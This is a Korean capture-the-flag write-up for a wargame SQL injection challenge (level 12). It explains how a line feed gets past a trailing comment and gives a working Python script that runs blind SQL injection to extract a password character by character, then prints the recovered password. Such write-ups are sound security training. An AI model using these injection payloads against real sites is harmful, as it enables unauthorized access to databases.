<img width="154" alt="스크린샷 2020-01-11 오후 5 18 10" src="https://user-images.githubusercontent.com/54495632/72201356-715ed300-3496-11ea-95eb-d6549c0c86af.png">

Lv 12.

<img width="797" alt="스크린샷 2020-01-11 오후 5 18 21" src="https://user-images.githubusercontent.com/54495632/72201357-76bc1d80-3496-11ea-8432-cf02f04ae3bd.png">

소스코드와 쿼리를 보자.

  $id = $_GET['id'];
  $pw = $_GET['pw'];

  if(preg_match('/play|_|\.|\(\)|info/i', $id)){ exit("Nope !!");}
  if(preg_match('/play|_|\.|\(|\)|info/i', $pw)){ exit("Nope !!");}

딱히 특별한 필터링 조건은 없다. 나머지 if elseif else 문도 그 전 문제와 같으나

$query = "SELECT * FROM play_sql12 WHERE id='$id'# and pw='$pw'";
쿼리를 보면 id 이후 #으로 주석이 붙게 된다.
해당 쿼리문을 우회하기위해 line feed를 이용하기로 했다.

우선 주석 전에서 length 함수를 통해 pw의 길이를 찾기로 했다.
<img width="710" alt="스크린샷 2020-01-11 오후 5 44 04" src="https://user-images.githubusercontent.com/54495632/72201801-05329e00-349b-11ea-98b6-721ee7b10357.png">
<img width="701" alt="스크린샷 2020-01-11 오후 5 44 35" src="https://user-images.githubusercontent.com/54495632/72201802-0794f800-349b-11ea-87d2-9b91172e05da.png">

pw 의 길이는 8이고 이 정보를 통해 파이썬을 이용하여 pw를 구했다.

전체 쿼리를 봤을 때 주석 전까지만 이용하여
select * from play_sql12 where id=''or ascii(substr(pw,1,1))=값#'# and pw='' 의 형식으로 쿼리를 반복문으로 던져 주면
pw 8자리 값을 찾을 수 있다.

<img width="256" alt="스크린샷 2020-01-11 오후 5 50 27" src="https://user-images.githubusercontent.com/54495632/72201817-3d39e100-349b-11ea-80c7-5d3a0e55fd5f.png">

import requests

cookies={'PHPSESSID':'쿠키값'}
url="http://crackus.jeju.kr/chall12.php?id="

pw=""
for i in range(1,9):
    for j in range(33,128):

        query="&id=%27or+ascii%28substr%28pw%2C"+str(i)+"%2C1%29%29%3D"+str(j)+"%23"
        geturl=url+query
        res=requests.get(geturl,cookies=cookies)
        if((res.text).find("Good J0b :)")>0):
            pw+=chr(j)
            print (pw)
            break

print ("finish pw :"+pw)

pw = c0ngr@z~ 이다.

<img width="726" alt="스크린샷 2020-01-11 오후 5 59 20" src="https://user-images.githubusercontent.com/54495632/72201871-1c25c000-349c-11ea-9cec-f9d07dd550ab.png">

pw 는 성립한다.

id 뒤에 있는 주석을 line feed %0a 를 주어 피하고 pw를 입력했다.

<img width="739" alt="스크린샷 2020-01-11 오후 6 01 13" src="https://user-images.githubusercontent.com/54495632/72201904-a837e780-349c-11ea-8f54-9ded08893cdf.png">

해결